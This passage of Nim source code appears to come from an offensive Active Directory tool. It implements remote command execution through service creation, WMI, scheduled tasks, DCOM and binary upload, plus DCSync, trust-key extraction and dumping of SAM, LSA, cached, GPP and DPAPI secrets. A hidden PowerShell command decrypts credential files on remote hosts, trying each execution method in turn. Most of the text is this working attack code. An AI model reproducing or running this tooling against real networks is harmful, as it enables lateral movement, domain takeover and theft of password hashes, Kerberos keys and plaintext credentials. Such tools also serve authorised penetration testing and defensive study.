  let r = await vncclient.probeVnc(host, config.port, config.timeoutMs, config.password)
  return %*{
    "protocol": "vnc", "host": host, "port": config.port,
    "reachable": r.reachable, "rfb_version": r.rfbVersion,
    "authenticated": r.authenticated, "auth_message": r.authMessage,
    "security_types": r.securityTypes, "desktop_name": r.desktopName
  }

proc wmiExecProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.remoteCommand.len == 0:
    return %*{
      "protocol": "cim", "host": host, "port": config.port,
      "error": "--cmd is required for wmi"
    }
  let exec = await wmiexecmod.wmiExec(host, config.port,
    max(config.timeoutMs, 10000),
    config.username, config.password, config.ntlmHash, config.domain,
    config.remoteCommand,
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
    ccache = config.ccachePath)
  return %*{
    "protocol": "cim",
    "host": exec.host,
    "port": config.port,
    "username": exec.username,
    "domain": exec.domain,
    "namespace": exec.namespace,
    "authenticated": exec.authenticated,
    "success": exec.success,
    "output": exec.output,
    "bytes_read": exec.bytesRead,
    "message": exec.message,
    "error": exec.error
  }

proc smbExecProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.remoteCommand.len == 0:
    return %*{
      "protocol": "scm",
      "host": host,
      "port": config.port,
      "error": "--cmd is required for service"
    }
  let exec = await smbexecmod.smbExec(host, config.port,
    max(config.timeoutMs, 8000),
    config.username, config.password, config.ntlmHash,
    config.domain, config.remoteCommand,
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
    ccache = config.ccachePath)
  result = %*{
    "protocol": "scm",
    "host": exec.host,
    "port": exec.port,
    "username": exec.username,
    "domain": exec.domain,
    "authenticated": exec.authenticated,
    "service_created": exec.serviceCreated,
    "service_started": exec.serviceStarted,
    "scm_status": "0x" & exec.scmStatus.toHex(8),
    "rpc_status": "0x" & exec.rpcStatus.toHex(8),
    "bytes_read": exec.bytesRead,
    "output": exec.output,
    "success": exec.success,
    "message": exec.message,
    "error": exec.error
  }

proc psExecProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.remoteCommand.len == 0:
    return %*{
      "protocol": "bin",
      "host": host,
      "port": config.port,
      "error": "--cmd is required for svc"
    }
  let exec = await psexecmod.psExec(host, config.port,
    max(config.timeoutMs, 8000),
    config.username, config.password, config.ntlmHash,
    config.domain, config.remoteCommand,
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
    ccache = config.ccachePath)
  result = %*{
    "protocol": "bin",
    "host": exec.host,
    "port": exec.port,
    "username": exec.username,
    "domain": exec.domain,
    "authenticated": exec.authenticated,
    "binary_uploaded": exec.binaryUploaded,
    "service_created": exec.serviceCreated,
    "service_started": exec.serviceStarted,
    "pipe_connected": exec.pipeConnected,
    "scm_status": "0x" & exec.scmStatus.toHex(8),
    "rpc_status": "0x" & exec.rpcStatus.toHex(8),
    "exit_code": exec.exitCode,
    "output": exec.output,
    "success": exec.success,
    "message": exec.message,
    "error": exec.error
  }

proc atExecProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.remoteCommand.len == 0:
    return %*{
      "protocol": "tsch",
      "host": host,
      "port": config.port,
      "error": "--cmd is required for task"
    }
  let exec = await atexecmod.atExec(host, config.port,
    max(config.timeoutMs, 8000),
    config.username, config.password, config.ntlmHash,
    config.domain, config.remoteCommand,
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
    ccache = config.ccachePath,
    krb5Config = config.krb5ConfigPath)
  result = %*{
    "protocol": "tsch",
    "host": exec.host,
    "port": exec.port,
    "username": exec.username,
    "domain": exec.domain,
    "authenticated": exec.authenticated,
    "task_created": exec.taskCreated,
    "task_started": exec.taskStarted,
    "bytes_read": exec.bytesRead,
    "output": exec.output,
    "success": exec.success,
    "message": exec.message,
    "error": exec.error
  }

proc dcomExecProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.remoteCommand.len == 0:
    return %*{
      "protocol": "mmc",
      "host": host,
      "port": config.port,
      "error": "--cmd is required for com"
    }
  let exec = await dcomexecmod.dcomExec(host, config.port,
    max(config.timeoutMs, 10000),
    config.username, config.password, config.ntlmHash,
    config.domain, config.remoteCommand,
    if config.dcomObject.len > 0: config.dcomObject else: "MMC20",
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
  return %*{
    "protocol": "mmc",
    "host": exec.host,
    "port": config.port,
    "username": exec.username,
    "domain": exec.domain,
    "success": exec.success,
    "output": exec.output,
    "bytes_read": exec.bytesRead,
    "message": exec.message,
    "error": exec.error
  }

proc xferToJson(r: smbtransfer.SmbTransferResult; verb: string): JsonNode =
  %*{
    "protocol": verb,
    "host": r.host,
    "share": r.share,
    "remote": r.remotePath,
    "local": r.localPath,
    "authenticated": r.authenticated,
    "bytes": r.bytes,
    "files": r.files,
    "success": r.success,
    "message": r.message,
    "error": r.error
  }

proc smbRemoteParent(path: string): string =
  let normalized = path.replace('/', '\\').strip(chars = {'\\'})
  let pos = normalized.rfind('\\')
  if pos < 0: return ""
  normalized[0 ..< pos]

proc collectLocalRecursiveFiles(root: string): seq[LocalRecursiveFile] =
  let localRoot = absolutePath(root)
  for path in walkDirRec(localRoot):
    if not fileExists(path):
      continue
    result.add LocalRecursiveFile(
      path: path,
      relPath: relativePath(absolutePath(path), localRoot).replace('/', '\\'))

proc collectRecursiveShareEntries(session: smbclient.SmbSession; share, root: string):
    Future[RecursiveShareWalk] {.async.} =
  var pending: seq[tuple[remotePath, relPath: string]] = @[(root, "")]
  while pending.len > 0:
    let current = pending[^1]
    pending.setLen(pending.len - 1)
    let listing = await smbclient.listShareDirectory(session, share, current.remotePath)
    result.status = listing.status
    result.message = listing.message
    if listing.status != 0:
      return
    for entry in listing.entries:
      let childRemote =
        if current.remotePath.len > 0: current.remotePath & "\\" & entry.name else: entry.name
      let childRel =
        if current.relPath.len > 0: current.relPath / entry.name else: entry.name
      result.entries.add RecursiveShareEntry(
        remotePath: childRemote,
        relPath: childRel,
        size: int(entry.size),
        isDirectory: entry.isDirectory,
        attributes: entry.attributes)
      if entry.isDirectory and (entry.attributes and FileAttributeReparsePoint) == 0:
        pending.add (childRemote, childRel)

proc smbPutRecursiveProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  var resultState = smbtransfer.SmbTransferResult(
    host: host, share: config.shareName, remotePath: config.remotePath, localPath: config.localPath)
  if not dirExists(config.localPath):
    resultState.error = "local directory not found: " & config.localPath
    return xferToJson(resultState, "put")
  let credential = smbclient.SmbCredential(
    username: config.username, password: config.password,
    ntlmHash: config.ntlmHash, domain: config.domain,
    ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
  let authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm
  let session = await smbclient.establishSmbSession(host, config.port,
    max(config.timeoutMs, 5000), credential, authMethod)
  if session == nil or not session.authenticated:
    resultState.message = if session == nil: "no session" else: session.message
    return xferToJson(resultState, "put")
  resultState.authenticated = true
  let treeId = await smbclient.connectShareTree(session, config.shareName)
  if treeId == 0:
    resultState.message = "could not mount share \\\\" & host & "\\" & config.shareName
    asyncnet.close(session.ctx.socket)
    return xferToJson(resultState, "put")
  if not await smbtransfer.ensureRemoteDirOnTree(session, treeId, config.remotePath):
    resultState.message = "could not create remote directory " & config.remotePath
    asyncnet.close(session.ctx.socket)
    return xferToJson(resultState, "put")
  let localFiles = collectLocalRecursiveFiles(config.localPath)
  for item in localFiles:
    let rel = item.relPath
    let remoteFile = if rel.len > 0: config.remotePath & "\\" & rel else: config.remotePath
    let parent = smbRemoteParent(remoteFile)
    if parent.len > 0 and not await smbtransfer.ensureRemoteDirOnTree(session, treeId, parent):
      resultState.message = "could not create remote directory " & parent
      asyncnet.close(session.ctx.socket)
      return xferToJson(resultState, "put")
    let upload = await smbtransfer.putFileOnTree(session, treeId, config.shareName, remoteFile, item.path)
    if not upload.success:
      resultState.message = if upload.message.len > 0: upload.message else: "upload failed"
      resultState.error = upload.error
      asyncnet.close(session.ctx.socket)
      return xferToJson(resultState, "put")
    inc resultState.files
    resultState.bytes += upload.bytes
  resultState.success = true
  resultState.message = "uploaded " & $resultState.files & " files (" & $resultState.bytes & " bytes)"
  asyncnet.close(session.ctx.socket)
  return xferToJson(resultState, "put")

proc smbGetRecursiveProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  var resultState = smbtransfer.SmbTransferResult(
    host: host, share: config.shareName, remotePath: config.remotePath, localPath: config.localPath)
  let credential = smbclient.SmbCredential(
    username: config.username, password: config.password,
    ntlmHash: config.ntlmHash, domain: config.domain,
    ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
  let authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm
  let session = await smbclient.establishSmbSession(host, config.port,
    max(config.timeoutMs, 5000), credential, authMethod)
  if session == nil or not session.authenticated:
    resultState.message = if session == nil: "no session" else: session.message
    return xferToJson(resultState, "get")
  resultState.authenticated = true
  let treeId = await smbclient.connectShareTree(session, config.shareName)
  if treeId == 0:
    resultState.message = "could not mount share \\\\" & host & "\\" & config.shareName
    asyncnet.close(session.ctx.socket)
    return xferToJson(resultState, "get")
  let collected = await collectRecursiveShareEntries(session, config.shareName, config.remotePath)
  if collected.status != 0:
    resultState.message = collected.message
    resultState.error = "recursive directory walk failed 0x" & collected.status.toHex(8)
    asyncnet.close(session.ctx.socket)
    return xferToJson(resultState, "get")
  for item in collected.entries:
    if item.isDirectory:
      continue
    let localFile = if config.localPath.len > 0: config.localPath / item.relPath else: item.relPath
    let localDir = parentDir(localFile)
    if localDir.len > 0:
      createDir(localDir)
    let download = await smbtransfer.getFileOnTree(session, treeId, config.shareName, item.remotePath, localFile)
    if not download.success:
      resultState.message = if download.message.len > 0: download.message else: "download failed"
      resultState.error = download.error
      asyncnet.close(session.ctx.socket)
      return xferToJson(resultState, "get")
    inc resultState.files
    resultState.bytes += download.bytes
  resultState.success = true
  resultState.message = "downloaded " & $resultState.files & " files (" & $resultState.bytes & " bytes)"
  asyncnet.close(session.ctx.socket)
  return xferToJson(resultState, "get")

proc smbLsProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.shareName.len == 0:
    return %*{
      "protocol": "ls",
      "host": host,
      "error": "ls requires --share <name> (--remote optional, defaults to share root)"
    }
  let credential = smbclient.SmbCredential(
    username: config.username, password: config.password,
    ntlmHash: config.ntlmHash, domain: config.domain,
    ccache: config.ccachePath)
  let session = await smbclient.establishSmbSession(host, config.port,
    max(config.timeoutMs, 5000), credential,
    if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
  if session == nil or not session.authenticated:
    let msg = if session == nil: "no session" else: session.message
    return %*{
      "protocol": "ls", "host": host, "share": config.shareName,
      "path": config.remotePath, "authenticated": false, "message": msg
    }
  if config.recursiveOp:
    let collected = await collectRecursiveShareEntries(session, config.shareName, config.remotePath)
    asyncnet.close(session.ctx.socket)
    var entries = newJArray()
    for e in collected.entries:
      entries.add %*{
        "path": e.remotePath,
        "size": e.size,
        "is_directory": e.isDirectory,
        "attributes": "0x" & e.attributes.toHex(8)
      }
    return %*{
      "protocol": "ls",
      "host": host,
      "share": config.shareName,
      "path": config.remotePath,
      "recursive": true,
      "authenticated": true,
      "entries": entries,
      "count": entries.len,
      "status": "0x" & collected.status.toHex(8),
      "message": collected.message
    }
  let listing = await smbclient.listShareDirectory(session, config.shareName,
    config.remotePath)
  asyncnet.close(session.ctx.socket)
  var entries = newJArray()
  for e in listing.entries:
    entries.add %*{
      "name": e.name,
      "size": e.size,
      "is_directory": e.isDirectory,
      "attributes": "0x" & e.attributes.toHex(8)
    }
  return %*{
    "protocol": "ls",
    "host": host,
    "share": config.shareName,
    "path": config.remotePath,
    "recursive": false,
    "authenticated": true,
    "entries": entries,
    "count": entries.len,
    "status": "0x" & listing.status.toHex(8),
    "message": listing.message
  }

proc trustKeysJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let queries = ldapclient.LdapQueryOptions(rootDse: true, trusts: true)
  let ldapPort = if config.port == 445 or config.port == 0: 389 else: config.port
  let probe = await ldapclient.probeLdap(
    host, ldapPort, max(config.timeoutMs, 5000),
    config.username, config.password, config.domain, config.ntlmHash,
    queries, kerberos = config.kerberos)
  var trustsArr = newJArray()
  for entry in probe.trusts:
    let flatName = firstAttr(entry, "flatName")
    let partner  = firstAttr(entry, "trustPartner")
    let direction = firstAttr(entry, "trustDirection")
    let trustType = firstAttr(entry, "trustType")
    var domainSid = ""
    if "securityIdentifier" in entry.attrs and entry.attrs["securityIdentifier"].len > 0:
      domainSid = sidFromRaw(entry.attrs["securityIdentifier"][0])
    let accountName = (if flatName.len > 0: flatName else: partner.split(".")[0]) & "$"
    var trustNode = %*{
      "partner": partner,
      "flat_name": flatName,
      "direction": direction,
      "trust_type": trustType,
      "domain_sid": domainSid,
      "account": accountName
    }
    if probe.authenticated:
      try:
        let sync = await dcsyncmod.dcSync(host, if config.port > 0: config.port else: 445,
          max(config.timeoutMs, 10000),
          config.username, config.password, config.ntlmHash, config.domain,
          accountName, kerberos = config.kerberos)
        if sync.accounts.len > 0:
          let acct = sync.accounts[0]
          let ntHex = if acct.ntHash.len > 0: dcsyncmod.toHexStr(acct.ntHash) else: ""
          var kerbKeys = newJArray()
          for k in acct.kerberosKeys:
            kerbKeys.add %*{"type": dcsyncmod.kerberosTypeName(k.keyType),
              "key": dcsyncmod.toHexStr(k.keyData)}
          trustNode["nt_hash"] = %ntHex
          trustNode["kerberos_keys"] = kerbKeys
        elif sync.error.len > 0:
          trustNode["error"] = %sync.error
      except CatchableError as e:
        trustNode["error"] = %e.msg.splitLines()[0]
    trustsArr.add trustNode
  return %*{
    "protocol": "dcsync",
    "operation": "trust-keys",
    "host": host,
    "port": config.port,
    "domain": config.domain,
    "authenticated": probe.authenticated,
    "success": probe.authenticated,
    "trusts": trustsArr,
    "message": if not probe.authenticated: probe.message else: ""
  }

proc dcSyncProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let previousKrb5Ccache = getEnv("KRB5CCNAME")
  let previousKrb5Config = getEnv("KRB5_CONFIG")
  let overrideKrb5Ccache = config.kerberos and config.ccachePath.len > 0
  var tempKrb5Config = ""
  if overrideKrb5Ccache:
    let cacheValue =
      if config.ccachePath.startsWith("FILE:"): config.ccachePath
      else: "FILE:" & config.ccachePath
    putEnv("KRB5CCNAME", cacheValue)
    if config.domain.len > 0:
      let realm = config.domain.toUpperAscii()
      let dnsDomain = config.domain.toLowerAscii()
      tempKrb5Config = getTempDir() / ("nimux-dcsync-krb5-" &
        $getCurrentProcessId() & "-" & $rand(1_000_000) & ".conf")
      writeFile(tempKrb5Config,
        "[libdefaults]\n" &
        " default_realm = " & realm & "\n" &
        " dns_lookup_kdc = false\n" &
        " dns_lookup_realm = false\n" &
        " rdns = false\n\n" &
        "[realms]\n" &
        " " & realm & " = {\n" &
        "  kdc = " & host & "\n" &
        " }\n\n" &
        "[domain_realm]\n" &
        " ." & dnsDomain & " = " & realm & "\n" &
        " " & dnsDomain & " = " & realm & "\n")
      putEnv("KRB5_CONFIG", tempKrb5Config)
  defer:
    if overrideKrb5Ccache:
      if previousKrb5Ccache.len > 0:
        putEnv("KRB5CCNAME", previousKrb5Ccache)
      else:
        delEnv("KRB5CCNAME")
      if previousKrb5Config.len > 0:
        putEnv("KRB5_CONFIG", previousKrb5Config)
      else:
        delEnv("KRB5_CONFIG")
      if tempKrb5Config.len > 0:
        try: removeFile(tempKrb5Config)
        except OSError: discard
  let r =
    try:
      await dcsyncmod.dcSync(host, config.port,
        max(config.timeoutMs, 10000),
        config.username, config.password, config.ntlmHash, config.domain,
        config.ldapUser, kerberos = config.kerberos)
    except:
      dcsyncmod.DcSyncResult(host: host, port: config.port,
        error: getCurrentExceptionMsg())
  let nt4Domain = dcsyncmod.nt4DomainName(r.domain)
  var accounts = newJArray()
  for acct in r.accounts:
    var ntHistory = newJArray()
    for h in acct.ntHistory: ntHistory.add %dcsyncmod.toHexStr(h)
    var lmHistory = newJArray()
    for h in acct.lmHistory: lmHistory.add %dcsyncmod.toHexStr(h)
    let ntHex = if acct.ntHash.len > 0: dcsyncmod.toHexStr(acct.ntHash) else: ""
    let lmHex = if acct.lmHash.len > 0: dcsyncmod.toHexStr(acct.lmHash) else: ""
    var kerbKeys = newJArray()
    for k in acct.kerberosKeys:
      kerbKeys.add %*{
        "type": dcsyncmod.kerberosTypeName(k.keyType),
        "key": dcsyncmod.toHexStr(k.keyData)
      }
    accounts.add %*{
      "username": acct.username,
      "domain": nt4Domain,
      "rid": acct.rid,
      "nt_hash": ntHex,
      "lm_hash": lmHex,
      "nt_history": ntHistory,
      "lm_history": lmHistory,
      "kerberos_keys": kerbKeys
    }
  return %*{
    "protocol": "dcsync",
    "host": r.host,
    "port": r.port,
    "username": r.username,
    "domain": r.domain,
    "authenticated": r.authenticated,
    "accounts": accounts,
    "success": r.success,
    "message": r.message,
    "error": r.error
  }

proc secretsProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  var r = await secretsmod.dumpSecrets(host, config.port,
    max(config.timeoutMs, 10000),
    config.username, config.password, config.ntlmHash, config.domain,
    config.secretsFull, kerberos = config.kerberos,
    ccache = config.ccachePath, krb5Config = config.krb5ConfigPath)
  let dc =
    if config.domain.len > 0:
      try:
        await dcsyncmod.dcSync(host, config.port,
          max(config.timeoutMs, 10000),
          config.username, config.password, config.ntlmHash, config.domain,
          config.ldapUser, kerberos = config.kerberos)
      except:
        dcsyncmod.DcSyncResult(error: getCurrentExceptionMsg())
    else:
      dcsyncmod.DcSyncResult()
  let nt4Domain = dcsyncmod.nt4DomainName(config.domain)
  var samArr = newJArray()
  for a in r.samAccounts:
    samArr.add %*{
      "username": a.username,
      "rid": a.rid,
      "nt_hash": secretsmod.toHexStr(a.ntHash),
      "lm_hash": secretsmod.toHexStr(a.lmHash)
    }
  if dc.success:
    for a in dc.accounts:
      let ntHex = if a.ntHash.len > 0: dcsyncmod.toHexStr(a.ntHash) else: ""
      let lmHex = if a.lmHash.len > 0: dcsyncmod.toHexStr(a.lmHash) else: ""
      let domainUser =
        if a.username.contains("\\") or nt4Domain.len == 0: a.username
        else: nt4Domain & "\\" & a.username
      samArr.add %*{
        "username": domainUser,
        "rid": a.rid,
        "nt_hash": ntHex,
        "lm_hash": lmHex
      }
  var lsaArr = newJArray()
  for s in r.lsaSecrets:
    let lsaPlain =
      if s.secretType in ["service", "default_password"]: s.plainText
      else: secretsmod.toHexStr(s.plainText)
    var lsaNode = %*{
      "name": s.name,
      "type": s.secretType,
      "plaintext": lsaPlain
    }
    if s.ntHash.len > 0:
      lsaNode["nt_hash"] = %s.ntHash
    if s.accountName.len > 0:
      lsaNode["account"] = %s.accountName
    if s.kerbKeys.len > 0:
      var kArr = newJArray()
      for k in s.kerbKeys: kArr.add %*{"type": k.keyType, "key": k.keyHex}
      lsaNode["kerberos_keys"] = kArr
    lsaArr.add lsaNode
  var cachedArr = newJArray()
  for c in r.cachedCreds:
    cachedArr.add %*{
      "domain": c.domain,
      "username": c.username,
      "dcc2": c.dcc2
    }
  var rawArr = newJArray()
  for line in r.rawLines:
    rawArr.add %line
  if dc.success:
    rawArr.add %("[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)")
    rawArr.add %("[*] Using the DRSUAPI method to get NTDS.DIT secrets")
    for a in dc.accounts:
      let domainUser =
        if a.username.contains("\\") or nt4Domain.len == 0: a.username
        else: nt4Domain & "\\" & a.username
      for k in a.kerberosKeys:
        rawArr.add %(domainUser & ":" & dcsyncmod.kerberosTypeName(k.keyType) &
          ":" & dcsyncmod.toHexStr(k.keyData))
  var mkArr = newJArray()
  for mk in r.dpapiMasterKeys:
    mkArr.add %*{"guid": mk.guid, "type": mk.keyType, "key": mk.key}
  if config.secretsOnline:
    let failedCreds = r.dpapiCredentials.filterIt(it.error.len > 0 and it.file.len > 0)
    if failedCreds.len > 0:
      let credSearchPaths = [
        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\",
        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials\\",
        "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials\\",
        "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials\\",
        "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials\\",
        "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials\\",
      ]
      var userCredPaths: seq[string]
      for a in r.samAccounts:
        let uname = if '\\' in a.username: a.username[a.username.rfind('\\')+1..^1] else: a.username
        if uname.len > 0 and uname notin ["Administrator","Guest","DefaultAccount","WDAGUtilityAccount"]:
          userCredPaths.add "C:\\Users\\" & uname & "\\AppData\\Local\\Microsoft\\Credentials\\"
          userCredPaths.add "C:\\Users\\" & uname & "\\AppData\\Roaming\\Microsoft\\Credentials\\"
      for fc in failedCreds:
        let credFilePath =
          if fc.filePath.len > 0:
            "C:\\" & fc.filePath.replace("\\\\", "\\")
          else:
            block:
              var p = ""
              for sp in credSearchPaths:
                p = sp & fc.file
                break
              p
        if credFilePath.len == 0: continue
        let psCmd = "Add-Type -Assembly System.Security;" &
          "$b=[System.IO.File]::ReadAllBytes('" & credFilePath & "');" &
          "$blob=$b[12..($b.Length-1)];" &
          "$r=$null;" &
          "try{$r=[System.Security.Cryptography.ProtectedData]::Unprotect($blob,$null,'LocalMachine')}catch{};" &
          "if(-not $r){try{$r=[System.Security.Cryptography.ProtectedData]::Unprotect($blob,$null,'CurrentUser')}catch{}};" &
          "if($r){[Convert]::ToBase64String($r)}else{'FAILED'}"
        let execCmd = "powershell -NoP -W Hidden -C \"" & psCmd & "\""
        var output = ""
        let execMethods =
          if config.secretsExecMethod.len > 0: @[config.secretsExecMethod]
          else: @["winrm", "svc", "wmi", "atexec"]
        var execCfg = config
        execCfg.remoteCommand = execCmd
        for meth in execMethods:
          if output.len > 0: break
          case meth
          of "winrm":
            let wr = winrmclient.runWinRmCommand(host, 5985,
              config.username, config.password, config.ntlmHash, config.domain,
              execCmd, useSsl = false,
              authMethod = if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm)
            if wr.success: output = wr.output.strip()
          of "svc", "service", "smbexec":
            let se = await smbexecmod.smbExec(host, config.port,
              max(config.timeoutMs, 15000),
              config.username, config.password, config.ntlmHash, config.domain,
              execCmd, waitMs = 4000,
              authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
              ccache = config.ccachePath)
            if se.success: output = se.output.strip()
          of "wmi":
            let we = await wmiexecmod.wmiExec(host, config.port,
              max(config.timeoutMs, 15000),
              config.username, config.password, config.ntlmHash, config.domain,
              execCmd,
              authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
              ccache = config.ccachePath)
            if we.success: output = we.output.strip()
          of "atexec":
            let ae = await atexecmod.atExec(host, config.port,
              max(config.timeoutMs, 15000),
              config.username, config.password, config.ntlmHash, config.domain,
              execCmd,
              authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
              ccache = config.ccachePath)
            if ae.success: output = ae.output.strip()
          of "dcom":
            let de = await dcomexecmod.dcomExec(host, config.port,
              max(config.timeoutMs, 15000),
              config.username, config.password, config.ntlmHash, config.domain,
              execCmd,
              authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
            if de.success: output = de.output.strip()
          else: discard
        if output.len > 0 and output != "FAILED":
          try:
            let decoded = base64.decode(output)
            for i in 0 ..< r.dpapiCredentials.len:
              if r.dpapiCredentials[i].file == fc.file:
                let parsed = dpapimod.parseDecryptedCredentialPublic(decoded)
                r.dpapiCredentials[i] = parsed
                r.dpapiCredentials[i].file = fc.file
                r.dpapiCredentials[i].masterKeyGuid = fc.masterKeyGuid
                break
          except CatchableError:
            discard

  var credArr = newJArray()
  for c in r.dpapiCredentials:
    credArr.add %*{"file": c.file, "file_path": c.filePath, "mk_guid": c.masterKeyGuid, "target": c.target,
                   "username": c.username, "cred_blob": c.credBlob,
                   "cred_blob_hex": c.credBlobHex, "type": c.credType,
                   "description": c.description, "error": c.error}
  var gppArr = newJArray()
  for g in r.gppPasswords:
    gppArr.add %*{"file": g.file, "username": g.username,
                  "new_name": g.newName, "password": g.password,
                  "changed": g.changed, "disabled": g.disabled}
  return %*{
    "protocol": "secrets",
    "host": host,
    "port": r.port,
    "authenticated": r.authenticated,
    "boot_key": r.bootKey,
    "sam_accounts": samArr,
    "lsa_secrets": lsaArr,
    "cached_creds": cachedArr,
    "raw_lines": rawArr,
    "domain_backup_key": secretsmod.toHexStr(r.domainBackupKey),
    "dpapi_machine_key": r.dpapiMachineKey,
    "dpapi_user_key": r.dpapiUserKey,
    "dpapi_master_keys": mkArr,
    "dpapi_credentials": credArr,
    "gpp_passwords": gppArr,
    "success": r.success or dc.success,
    "message": if dc.success and dc.message.len > 0: dc.message
               elif r.message.len > 0: r.message
               else: dc.message,
    "error": if r.success or dc.success: "" else: r.error
  }

proc smbPutProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.shareName.len == 0 or config.remotePath.len == 0 or
      config.localPath.len == 0:
    return %*{
      "protocol": "put",
      "host": host,
      "error": "put requires --share <name> --remote <path> --local <path>"
    }
  if config.recursiveOp or dirExists(config.localPath):
    return await smbPutRecursiveProbeOne(host, config)
  let r = await smbtransfer.putFile(host, config.port,
    max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain,
    config.shareName, config.remotePath, config.localPath,
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
    ccache = config.ccachePath, krb5Config = config.krb5ConfigPath)
  return xferToJson(r, "put")

proc smbGetProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.shareName.len == 0 or config.remotePath.len == 0 or
      config.localPath.len == 0:
    return %*{
      "protocol": "get",
      "host": host,
      "error": "get requires --share <name> --remote <path> --local <path>"
    }
  if config.recursiveOp:
    return await smbGetRecursiveProbeOne(host, config)
  let r = await smbtransfer.getFile(host, config.port,
    max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain,
    config.shareName, config.remotePath, config.localPath,
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
    ccache = config.ccachePath, krb5Config = config.krb5ConfigPath)
  return xferToJson(r, "get")

proc smbRmProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.shareName.len == 0 or config.remotePath.len == 0:
    return %*{"protocol": "rm", "host": host,
      "error": "rm requires --share <name> --remote <path>"}
  let r = await smbtransfer.deleteFile(host, config.port,
    max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain,
    config.shareName, config.remotePath,
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
    ccache = config.ccachePath, krb5Config = config.krb5ConfigPath)
  return xferToJson(r, "rm")

proc smbMkdirProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.shareName.len == 0 or config.remotePath.len == 0:
    return %*{"protocol": "mkdir", "host": host,
      "error": "mkdir requires --share <name> --remote <dir>"}
  let r = await smbtransfer.ensureRemoteDir(host, config.port,
    max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain,
    config.shareName, config.remotePath,
    authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
    ccache = config.ccachePath)
  return xferToJson(r, "mkdir")

proc protocolProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  case config.protocol
  of "smb":
    result = await smbProbeOne(host, config)
  of "ldap":
    result = await ldapProbeOne(host, config)
  of "winrm":
    result = await winRmProbeOne(host, config)
  of "mssql":
    result = await msSqlProbeOne(host, config)
  of "rdp":
    result = await rdpProbeOne(host, config)
  of "ssh":
    result = await sshProbeOne(host, config)
  of "vnc":
    result = await vncProbeOne(host, config)
  of "ftp":
    result = await ftpProbeOne(host, config)
  of "mysql":
    result = await mysqlProbeOne(host, config)
  of "postgres":
    result = await postgresProbeOne(host, config)
  of "afp":
    result = await afpProbeOne(host, config)
  of "nfs":
    result = await nfsProbeOne(host, config)
  of "webdav":
    result = await webdavProbeOne(host, config)
  of "http", "https":
    result = await httpProbeOne(host, config)
  of "scm":
    result = await smbExecProbeOne(host, config)
  of "cim":
    result = await wmiExecProbeOne(host, config)
  of "bin":
    result = await psExecProbeOne(host, config)
  of "tsch":
    result = await atExecProbeOne(host, config)
  of "mmc":
    result = await dcomExecProbeOne(host, config)
  of "put":
    result = await smbPutProbeOne(host, config)
  of "get":
    result = await smbGetProbeOne(host, config)
  of "ls":
    result = await smbLsProbeOne(host, config)
  of "rm":
    result = await smbRmProbeOne(host, config)
  of "mkdir":
    result = await smbMkdirProbeOne(host, config)
  of "dcsync":
    if config.dcSyncTrustKeys:
      result = await trustKeysJson(host, config)
    else:
      result = await dcSyncProbeOne(host, config)
  of "secrets":
    result = await secretsProbeOne(host, config)
  of "kerberos":
    result = await kerberosProbeOne(host, config)
  else:
    raise newException(ValueError, "unknown protocol: " & config.protocol)

var colorEnabled =
  not (getEnv("NO_COLOR").len > 0) and isatty(stdout)

proc esc(code: string; text: string): string =
  if colorEnabled: "\e[" & code & "m" & text & "\e[0m"
  else: text

proc bold(text: string): string = esc("1", text)
proc dim(text: string): string = esc("2", text)
proc cyan(text: string): string = esc("36", text)
proc brightCyan(text: string): string = esc("1;36", text)
proc green(text: string): string = esc("32", text)
proc brightGreen(text: string): string = esc("1;32", text)
proc yellow(text: string): string = esc("33", text)
